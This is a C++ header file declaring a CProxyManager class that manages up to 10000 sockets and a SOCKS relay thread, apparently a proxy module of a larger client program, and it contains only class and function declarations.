// ProxyManager.h: interface for the CProxyManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_ProxyManager_H__CCDCEFAB_AFD9_4F2C_A633_637ECB94B6EE__INCLUDED_)
#define AFX_ProxyManager_H__CCDCEFAB_AFD9_4F2C_A633_637ECB94B6EE__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#include <winsock2.h>
#include "Manager.h"
 

class CProxyManager : public CManager  
{
public:
	CProxyManager(CClientSocket *pClient);
	virtual ~CProxyManager();

	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);

    SOCKET m_Socket[10000];
	CRITICAL_SECTION Sec;

	void SendConnectResult(LPBYTE lpBuffer,DWORD ip,USHORT port);

	int Send(LPBYTE lpData, UINT nSize);
	void Disconnect(DWORD index);
};

static DWORD WINAPI SocksThread(LPVOID lparam);
struct SocksThreadArg
{
	CProxyManager *pThis;
	LPBYTE lpBuffer;
};
#endif // !defined(AFX_ProxyManager_H__CCDCEFAB_AFD9_4F2C_A633_637ECB94B6EE__INCLUDED_)
